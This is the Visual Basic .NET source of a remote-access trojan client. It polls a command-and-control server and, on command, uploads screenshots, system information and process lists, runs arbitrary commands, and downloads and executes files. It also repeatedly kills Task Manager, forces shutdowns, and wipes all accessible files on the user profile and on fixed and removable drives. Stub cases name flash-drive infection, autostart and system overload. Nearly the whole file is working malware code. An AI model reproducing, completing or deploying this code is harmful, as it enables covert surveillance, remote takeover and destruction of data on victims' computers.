Imports System.IO
Imports System.Text
Imports System.Threading
Imports System.Management
Imports System.Security.Cryptography

Public Class Form1

    Dim SERVER_GATEWAY As String = "http://localhost/12420/index.php"
    Dim SERVER_KEY As String = "MOONSTONE_0193341859"
    Dim MACHINE_ID As String = "MACHINEMACHINEMACHIN"
    Dim TASK_MANAGER As String = "ENABLED_DEFAULT"

    Dim ACTIVE_COMMAND As String = ""
    Dim ACTIVE_COMPONENT As String = ""
    Dim COMMAND_STATUS As String = ""
    Dim ACTIVE_PROCESS As String = ""
    Dim REFRESH_FREQ As Integer = 1000
    Dim PROCESS_STATUS As String = ""
    Dim PROCESS_STATUS2 As String = ""
    Dim DEL_ALL_FILES As String = ""

    Sub KillProcess(ByVal ProcessName As String)
        Dim processList() As Process = Process.GetProcessesByName(ProcessName)

        If processList.Length <> 0 Then
            For Each proc As Process In processList
                If Process.GetProcessesByName(proc.ProcessName).Count <> 0 Then
                    proc.Kill()
                End If
            Next
        End If
    End Sub

    Private Shared Function GetCodecInfo(ByVal mimeType As String) As Imaging.ImageCodecInfo
        For Each encoder As Imaging.ImageCodecInfo In Imaging.ImageCodecInfo.GetImageEncoders()
            If encoder.MimeType = mimeType Then
                Return encoder
            End If
        Next encoder
        Throw New ArgumentOutOfRangeException(String.Format("'{0}' not supported", mimeType))
    End Function

    Public Shared Sub ScreenCapture(ByVal captureSavePath As String, ByVal quality As Long)
        Dim bmp As Bitmap = New Bitmap(
                            Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                            Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
        Dim gfx As Graphics = Graphics.FromImage(bmp)
        gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                           SystemInformation.VirtualScreen.Y,
                           0, 0, SystemInformation.VirtualScreen.Size)
        Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
        Dim parameters As New Imaging.EncoderParameters(1)
        parameters.Param(0) = New Imaging.EncoderParameter(Imaging.Encoder.Quality, quality)
        bmp.Save(captureSavePath, GetCodecInfo("image/jpeg"), parameters)
    End Sub

    Shared Function GetMD5Hash(theInput As String) As String
        Using hasher As MD5 = MD5.Create()
            Dim dbytes As Byte() =
             hasher.ComputeHash(Encoding.UTF8.GetBytes(theInput))
            Dim sBuilder As New StringBuilder()
            For n As Integer = 0 To dbytes.Length - 1
                sBuilder.Append(dbytes(n).ToString("X2"))
            Next n
            Return sBuilder.ToString()
        End Using
    End Function

    Public Shared Iterator Function _GetFiles(ByVal root As String, ByVal searchPattern As String) As IEnumerable(Of String)
        Dim pending As Stack(Of String) = New Stack(Of String)()
        pending.Push(root)
        While pending.Count <> 0
            Dim path = pending.Pop()
            Dim [next] As String() = Nothing
            Try
                [next] = Directory.GetFiles(path, searchPattern)
            Catch
            End Try

            If [next] IsNot Nothing AndAlso [next].Length <> 0 Then
                For Each file In [next]
                    Yield file
                Next
            End If

            Try
                [next] = Directory.GetDirectories(path)
                For Each subdir In [next]
                    pending.Push(subdir)
                Next
            Catch
            End Try
        End While
    End Function

    Public Shared Iterator Function _GetDirectories(ByVal root As String, ByVal searchPattern As String) As IEnumerable(Of String)
        Dim pending As Stack(Of String) = New Stack(Of String)()
        pending.Push(root)
        While pending.Count <> 0
            Dim path = pending.Pop()
            Dim [next] As String() = Nothing
            Try
                [next] = Directory.GetDirectories(path, searchPattern)
            Catch
            End Try

            If [next] IsNot Nothing AndAlso [next].Length <> 0 Then
                For Each file In [next]
                    Yield file
                Next
            End If

            Try
                [next] = Directory.GetDirectories(path)
                For Each subdir In [next]
                    pending.Push(subdir)
                Next
            Catch
            End Try
        End While
    End Function

    Public Shared Sub DeleteAll(ByVal path As String, Optional ByVal Files As Boolean = True, Optional ByVal Directories As Boolean = True)
        Dim _deletedEntries As String = ""
        Dim _delERR As Boolean = False
        Try

            For Each deleteFile In _GetFiles(path, "*")
                Try
                    File.Delete(deleteFile)
                    _deletedEntries = _deletedEntries & "DELETED - " & deleteFile & vbLf

                Catch ex As Exception
                    _deletedEntries = _deletedEntries & "SKIPPED - " & deleteFile & vbLf
                    _delERR = True
                End Try
            Next

            For Each deletefolder In _GetDirectories(path, "*").Reverse
                Try
                    Directory.Delete(deletefolder)
                    _deletedEntries = _deletedEntries & "DELETED - " & deletefolder & vbLf
                Catch ex As Exception
                    _deletedEntries = _deletedEntries & "SKIPPED - " & deletefolder & vbLf
                    _delERR = True
                End Try
            Next
        Catch

        End Try

    End Sub

    'Private Declare Function ExitWindowsEx Lib "user32" (ByVal dwOptions As Integer, ByVal dwReserved As Integer) As Integer

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        BackgroundWorker1.RunWorkerAsync()
        BackgroundWorker2.RunWorkerAsync()
        Do While True
            If ACTIVE_PROCESS = "" Then
                Dim httpFetch As New Net.WebClient()
                Dim xmlData As New Xml.XmlDocument()
                Try
                    xmlData.LoadXml(httpFetch.DownloadString(SERVER_GATEWAY & "?key=" & SERVER_KEY & "&machine=" & MACHINE_ID & "&action=getcommand"))
                    ACTIVE_COMMAND = xmlData.SelectSingleNode("main/directive").InnerText
                Catch ex As Exception
                    Debug.WriteLine("Cannot connect to server. Reconnecting...")
                End Try
                Try
                    Dim _data As Byte() = Convert.FromBase64String(xmlData.SelectSingleNode("main/data").InnerText)
                    ACTIVE_COMPONENT = Encoding.UTF8.GetString(_data)
                Catch ex As Exception
                End Try
                Select Case ACTIVE_COMMAND
                    Case "6288493926" 'DISABLE TASK MANAGER - DONE
                        TASK_MANAGER = "DISABLED"
                        ACTIVE_PROCESS = ACTIVE_COMMAND
                    Case "8327160372" 'ENABLE TASK MANAGER - DONE
                        TASK_MANAGER = "ENABLED"
                        ACTIVE_PROCESS = ACTIVE_COMMAND
                    Case "7392749572" 'GET SCREENSHOT
                        Dim XS_FAILED As Boolean = False
                        Try
                            Dim SCLocation = String.Format("{0}\_Temp.STASH\SCREENSHOT\IMG_SC.jpg", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                            ScreenCapture(SCLocation, 100)
                            PROCESS_STATUS = "Uploading Screenshot"
                        Catch ex As Exception
                            PROCESS_STATUS = "Screenshot Failed"
                            XS_FAILED = True
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        If XS_FAILED = False Then
                            Try
                                If (File.Exists(String.Format("{0}\_Temp.STASH\SCREENSHOT\IMG_SC.jpg", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))) Then
                                    httpFetch.UploadFile(SERVER_GATEWAY & "?key=" & SERVER_KEY & "&machine=" & MACHINE_ID & "&action=upload&type=screenshot", String.Format("{0}\_Temp.STASH\SCREENSHOT\IMG_SC.jpg", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
                                End If
                                PROCESS_STATUS2 = "Screenshot Uploaded"
                            Catch ex As Exception
                                PROCESS_STATUS2 = "Screenshot Upload Failed"
                            End Try
                        End If
                        COMMAND_STATUS = PROCESS_STATUS2
                        Debug.WriteLine(PROCESS_STATUS2)
                    Case "1275937583" 'GET SYSTEM INFO
                        Try
                            Dim objOS As ManagementObjectSearcher = New ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem")
                            Dim objCS As ManagementObjectSearcher = New ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")
                            Dim m_strOSName As String = "n/a"
                            Dim m_strOSVersion As String = "n/a"
                            Dim m_strComputerName As String = "n/a"
                            Dim m_strWindowsDir As String = "n/a"
                            Dim m_strManufacturer As String = "n/a"
                            Dim m_StrModel As String = "n/a"
                            Dim m_strSystemType As String = "n/a"
                            Dim m_strTPM As String = "n/a"
                            For Each objMgmt In objOS.Get
                                m_strOSName = objMgmt("name").ToString()
                                m_strOSVersion = objMgmt("version").ToString()
                                m_strComputerName = objMgmt("csname").ToString()
                                m_strWindowsDir = objMgmt("windowsdirectory").ToString()
                            Next
                            For Each objMgmt In objCS.Get
                                m_strManufacturer = objMgmt("manufacturer").ToString()
                                m_StrModel = objMgmt("model").ToString()
                                m_strSystemType = objMgmt("systemtype").ToString
                                m_strTPM = objMgmt("totalphysicalmemory").ToString()
                            Next
                            Dim BUILD_INFO As String = "<?xml version=""1.0"" encoding=""UTF-8""?>
<main>
    <operating_system>
        <os_name>" & m_strOSName & "</os_name>
        <os_version>" & m_strOSVersion & "</os_version>
        <comp_name>" & m_strComputerName & "</comp_name>
        <win_dir>" & m_strWindowsDir & "</win_dir>
    </operating_system>
    <management>
        <manufacturer>" & m_strManufacturer & "</manufacturer>
        <model>" & m_StrModel & "</model>
        <sys_type>" & m_strSystemType & "</sys_type>
        <total_pmem>" & m_strTPM & "</total_pmem>
    </management>
</main>"
                            Dim NC As New Specialized.NameValueCollection From {
                                {"BUILD_INFO", BUILD_INFO},
                                {"SIGNATURE", GetMD5Hash(BUILD_INFO & SERVER_KEY & "8832849224" & MACHINE_ID)}
                            }
                            httpFetch.UploadValues(SERVER_GATEWAY & "?key=" & SERVER_KEY & "&machine=" & MACHINE_ID & "&action=upload&type=pcinfo", NC)
                            PROCESS_STATUS = "System Information Uploaded"
                        Catch ex As Exception
                            PROCESS_STATUS = "System Information Upload Failed"
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                    Case "9374289402" 'CMD EXECUTE
                        Try
                            If ACTIVE_COMPONENT <> "" Then
                                Process.Start(ACTIVE_COMPONENT)
                                PROCESS_STATUS = "Command Executed"
                            Else
                                PROCESS_STATUS = "Command is Empty"
                            End If
                        Catch ex As Exception
                            PROCESS_STATUS = "Command Execution Failed"
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                    Case "3648852941" 'SHUTDOWN
                        PROCESS_STATUS = "Shutdown Sequence Initiating"
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        Try
                            If ACTIVE_COMPONENT <> "" Then
                                Thread.Sleep(ACTIVE_COMPONENT)
                                Process.Start("shutdown", "-s -t 00")
                            Else
                                Thread.Sleep(5000)
                                Process.Start("shutdown", "-s -t 00")
                            End If
                        Catch ex As Exception
                            PROCESS_STATUS = "Shutdown Request Failed"
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                    Case "6382925374" 'REBOOT
                        PROCESS_STATUS = "Reboot Sequence Initiating"
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        Try
                            If ACTIVE_COMPONENT <> "" Then
                                Thread.Sleep(ACTIVE_COMPONENT)
                                Process.Start("shutdown", "-r -t 00")
                            Else
                                Thread.Sleep(5000)
                                Process.Start("shutdown", "-r -t 00")
                            End If
                        Catch ex As Exception
                            PROCESS_STATUS = "Reboot Request Failed"
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                    Case "8399274629" 'LOG OFF
                        PROCESS_STATUS = "Log-off Sequence Initiating"
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        Try
                            If ACTIVE_COMPONENT <> "" Then
                                Thread.Sleep(ACTIVE_COMPONENT)
                                Process.Start("shutdown", "-l -t 00")
                            Else
                                Thread.Sleep(5000)
                                Process.Start("shutdown", "-l -t 00")
                            End If
                        Catch ex As Exception
                            PROCESS_STATUS = "Log-off Sequence Failed"
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                    Case "2840193875" 'DISPLAY MESSAGE
                        Try
                            If ACTIVE_COMPONENT <> "" Then
                                MessageBox.Show(ACTIVE_COMPONENT)
                                PROCESS_STATUS = "Message Displayed"
                            Else
                                PROCESS_STATUS = "Message Needs Specification"
                            End If
                        Catch ex As Exception
                            PROCESS_STATUS = "Message Display Failed"
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                    Case "8329475193" 'DELETE ALL ACCESSIBLE FILES
                        PROCESS_STATUS = "Deleting All Accessible Files In Background"
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        DEL_ALL_FILES = "DELETE"
                        ACTIVE_PROCESS = ACTIVE_COMMAND
                    Case "6427852016" 'FILE UPLOAD AND OPEN
                        Dim XS_FAILED As Boolean = False
                        Dim FILENAME = String.Format("{0}\_Temp.STASH\DOWNLOAD\" & ACTIVE_COMPONENT, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                        Try
                            If Directory.Exists(Path.GetDirectoryName(FILENAME)) = False Then
                                MkDir(Path.GetDirectoryName(FILENAME))
                            End If
                            Dim DL As String = SERVER_GATEWAY & "?key=" & SERVER_KEY & "&machine=" & MACHINE_ID & "&action=download&type=fuplandexec&signature=" & GetMD5Hash(ACTIVE_COMPONENT & SERVER_KEY & "5285103762" & MACHINE_ID)
                            httpFetch.DownloadFile(DL, FILENAME)
                            PROCESS_STATUS = "File Uploaded"
                        Catch ex As Exception
                            PROCESS_STATUS = ex.ToString()
                            XS_FAILED = True
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        If XS_FAILED = False Then
                            Try
                                If (File.Exists(FILENAME)) Then
                                    Dim p As New Process
                                    Dim s As New ProcessStartInfo(FILENAME) With {
                                        .UseShellExecute = True,
                                        .WindowStyle = ProcessWindowStyle.Normal
                                    }
                                    p.StartInfo = s
                                    p.Start()
                                    PROCESS_STATUS2 = "File Upload Executed"
                                Else
                                    PROCESS_STATUS2 = "File Upload Rejected"
                                End If
                            Catch ex As Exception
                                PROCESS_STATUS2 = "File Upload Failed"
                            End Try
                        End If
                        COMMAND_STATUS = PROCESS_STATUS2
                        Debug.WriteLine(PROCESS_STATUS2)
                    Case "2042692847" 'URL DOWNLOAD AND OPEN

                    Case "7349177392" 'KILL PROGRAM

                    Case "5326619730" 'GET TASKLIST
                        Dim TL_err = False
                        Dim TASKS_INFO As String = "d"
                        Try
                            Dim p As Process
                            Dim AllProcRAW As String = ""
                            For Each p In Process.GetProcesses
                                AllProcRAW = AllProcRAW & vbLf & "    <process><name>" & p.ProcessName & "</name><id>" & p.Id & "</id><title>" & p.MainWindowTitle & "</title><memory>" & p.WorkingSet64 & "</memory></process>"
                            Next
                            TASKS_INFO = "<?xml version=""1.0"" encoding=""UTF-8""?>" & vbLf & "<main>" & AllProcRAW & vbLf & "</main>"
                            PROCESS_STATUS = "Task List Uploading"
                        Catch ex As Exception
                            PROCESS_STATUS = "Task List Failed"
                            TL_err = True
                        End Try
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        If TL_err = False Then
                            Try
                                Dim NC2 As New Specialized.NameValueCollection From {
                                        {"TASK_LIST", TASKS_INFO},
                                        {"SIGNATURE", GetMD5Hash(TASKS_INFO & SERVER_KEY & "5729641964" & MACHINE_ID)}
                                    }
                                httpFetch.UploadValues(SERVER_GATEWAY & "?key=" & SERVER_KEY & "&machine=" & MACHINE_ID & "&action=upload&type=tasklist", NC2)
                                'Dim result As String = Encoding.ASCII.GetString(httpFetch.UploadValues(SERVER_GATEWAY & "?key=" & SERVER_KEY & "&machine=" & MACHINE_ID & "&action=upload&type=tasklist", NC2))
                                PROCESS_STATUS = "Task List Uploaded"
                            Catch ex As Exception
                                PROCESS_STATUS = "Task List Upload Failed"
                            End Try
                            COMMAND_STATUS = PROCESS_STATUS
                            Debug.WriteLine(PROCESS_STATUS)
                        End If
                    Case "8437294827" 'CLEAR DOWNLOADED FILES AND FOLDER
                        Dim _deletedEntries As String = ""
                        Dim _delERR As Boolean = False
                        Dim DL_PATH = String.Format("{0}\_Temp.STASH\DOWNLOAD\", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                        PROCESS_STATUS = "Cleaning STASH Uploaded Files"
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)

                        Try
                            DeleteAll(DL_PATH)
                        Catch ex As Exception
                            _delERR = True
                        End Try
                        If _delERR = True Then
                            PROCESS_STATUS = "STASH Uploaded Files Cleaning Failed"
                        Else
                            PROCESS_STATUS = "STASH Uploaded Files Cleaned"
                        End If
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                    Case "1204829430" 'SEND KILL CODE - DONE
                        PROCESS_STATUS = "Killing Current Process"
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        Application.Exit()
                        End
                    Case "1839205563" 'SEND RESET CODE
                        PROCESS_STATUS = "Restart Current Process"
                        COMMAND_STATUS = PROCESS_STATUS
                        Debug.WriteLine(PROCESS_STATUS)
                        Application.Restart()
                    Case "8301947287" 'TEXT-TO-SPEECH

                    Case "5429104639" 'ENABLE FLASHDRIVE INFECT

                    Case "3802918483" 'DISABLE FLASHDRIVE INFECT

                    Case "6294710482" 'OVERLOAD SYSTEM

                    Case "6291073652" 'ENABLE AUTOSTART

                    Case "0927591749" 'DISABLE AUTOSTART

                    Case "5391038276" 'ENABLE WIFI

                    Case "3829105638" 'DISABLE WIFI

                End Select
            End If
            Thread.Sleep(REFRESH_FREQ)
        Loop
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Dim PROCESS_STATUS2 As String = ""
        Dim _err As Boolean = False
        Dim TM_NOACT As String = ""
        If TASK_MANAGER = "ENABLED_DEFAULT" Then
            TM_NOACT = "E"
        ElseIf TASK_MANAGER = "DISABLED_DEFAULT" Then
            TM_NOACT = "D"
        End If
        Do While True
            Try
                If TASK_MANAGER = "DISABLED_DEFAULT" Or TASK_MANAGER = "DISABLED" Then
                    KillProcess("taskmgr")
                End If
            Catch ex As Exception
                _err = True
            End Try
            If ACTIVE_PROCESS = "6288493926" Or ACTIVE_PROCESS = "8327160372" Then
                If _err = False Then
                    If TASK_MANAGER = "DISABLED" Then
                        If TM_NOACT = "D" Then
                            PROCESS_STATUS2 = "Task Manager Already Disabled"
                        Else
                            PROCESS_STATUS2 = "Task Manager Disabled"
                            TM_NOACT = "D"
                        End If
                    ElseIf TASK_MANAGER = "ENABLED" Then
                        If TM_NOACT = "E" Then
                            PROCESS_STATUS2 = "Task Manager Already Enabled"
                        Else
                            PROCESS_STATUS2 = "Task Manager Enabled"
                            TM_NOACT = "E"
                        End If
                    End If
                Else
                    PROCESS_STATUS2 = "Task Manager Disable Failed"
                End If
                COMMAND_STATUS = PROCESS_STATUS2
                Debug.WriteLine(PROCESS_STATUS2)
                ACTIVE_PROCESS = ""
            End If
            If TASK_MANAGER = "ENABLED" Or TASK_MANAGER = "ENABLED_DEFAULT" Then
                Thread.Sleep(1000)
            End If
        Loop
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Do While True
            If DEL_ALL_FILES = "DELETE" Then
                Try
                    DeleteAll(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
                    Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
                    Dim d As DriveInfo
                    For Each d In allDrives
                        If d.DriveType = 2 And d.IsReady Then
                            PROCESS_STATUS = "Deleting Files in Drive " & d.Name
                            COMMAND_STATUS = PROCESS_STATUS
                            Debug.WriteLine(PROCESS_STATUS)
                            DeleteAll(d.Name)
                        ElseIf d.DriveType = 3 And d.IsReady Then
                            PROCESS_STATUS = "Deleting Files in Drive " & d.Name
                            COMMAND_STATUS = PROCESS_STATUS
                            Debug.WriteLine(PROCESS_STATUS)
                            DeleteAll(d.Name)
                        End If
                    Next
                    PROCESS_STATUS = "Files Delete Completed"
                Catch ex As Exception
                    PROCESS_STATUS = "Files Delete Failed"
                End Try
                COMMAND_STATUS = PROCESS_STATUS
                Debug.WriteLine(PROCESS_STATUS)
                ACTIVE_PROCESS = ""
                DEL_ALL_FILES = ""
            End If
            Thread.Sleep(2000)
        Loop
    End Sub
End Class